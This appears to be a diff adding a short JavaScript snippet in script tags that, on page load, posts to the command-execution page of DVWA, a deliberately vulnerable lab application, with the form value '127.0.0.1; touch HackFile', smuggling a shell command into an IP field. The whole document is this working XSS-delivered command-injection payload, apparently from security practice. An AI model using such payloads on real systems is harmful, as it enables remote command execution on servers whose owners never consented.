@@ -1,0 +1,10 @@
+<script>
+function createFile(command)
+{
+var xhr =  new XMLHttpRequest();
+xhr.open('POST', 'http://dvwa.local/vulnerabilities/exec/', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xhr.send('ip='+command+'&submit=submit');
+}
+createFile("127.0.0.1; touch HackFile");
+</script> 
